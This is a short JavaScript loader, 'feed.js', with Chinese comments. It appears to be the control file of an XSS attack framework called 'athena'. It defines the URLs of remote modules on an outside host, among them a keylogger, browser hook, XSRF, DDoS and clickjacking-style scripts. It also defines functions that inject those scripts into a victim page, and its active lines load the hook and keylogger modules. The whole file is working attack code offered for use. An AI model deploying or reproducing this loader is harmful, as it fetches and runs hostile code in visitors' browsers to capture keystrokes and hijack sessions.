//////////////////////////////////////////////////////////////
// feed.js 是中心控制文件，在这里插入各种脚本模块
//alert("feed.js 种子");
var $d=document;

///////////////////////////////////////////////////////////////////////
// function library
var BaseLib = "http://www.secwiki.com/athena/library/base.js";
var Base64Lib = "http://www.secwiki.com/athena/library/base64.js";
var AjaxLib = "http://www.secwiki.com/athena/library/ajax.js";
var UtfLib = "http://www.secwiki.com/athena/library/utf.js";
var HookLib = "http://www.secwiki.com/athena/library/hooklib.js";
var JqueryLib = "http://www.secwiki.com/athena/library/jquery.js";

///////////////////////////////////////////////////////////////////////
// Module
var BoomerangMod = "http://www.secwiki.com/athena/module/boomerang.js";
var ClxMod = "http://www.secwiki.com/athena/module/clx.js";
var XsrfMod = "http://www.secwiki.com/athena/module/xsrf.js";
var DdosMod = "http://www.secwiki.com/athena/module/ddos.js";
var HookMod = "http://www.secwiki.com/athena/module/hook.js";
var KeyloggerMod = "http://www.secwiki.com/athena/module/keylog.js";

///////////////////////////////////////////////////////////////////////

function InjectScript(ptr_sc){
    s=document.createElement("script");
    s.src=ptr_sc;
    document.getElementsByTagName("body")[0].appendChild(s);
}

function AddScript(ptr_sc){
    $d.write("<script src='"+ptr_sc+"'></script>");
}

/////////////////////////////////////
////// 模块加载
try {
    //InjectScript 和 AddScript 都不是很稳定,看情况选用 
    
    //InjectScript(BaseLib);
    //InjectScript(Base64Lib);
    //InjectScript(UtfLib);
    //InjectScript(AjaxLib);
    //InjectScript(HookLib);
    //InjectScript(JqueryLib);
    
    //InjectScript(ClxMod);
    //InjectScript(XsrfMod);
    //InjectScript(BoomerangMod);
    //InjectScript(DdosMod);
    //InjectScript(HookMod);
    //InjectScript(KeyloggerMod);
    
    ///////////////////////////////////////////////////
    AddScript(BaseLib);
    //AddScript(Base64Lib);
    //AddScript(UtfLib);
    //AddScript(AjaxLib);
    AddScript(HookLib);
    AddScript(JqueryLib);
    
    AddScript(ClxMod);
    //AddScript(XsrfMod);
    //AddScript(BoomerangMod);
    //AddScript(DdosMod);
    AddScript(HookMod);
    AddScript(KeyloggerMod);
}
catch (e){
    //alert(e);
}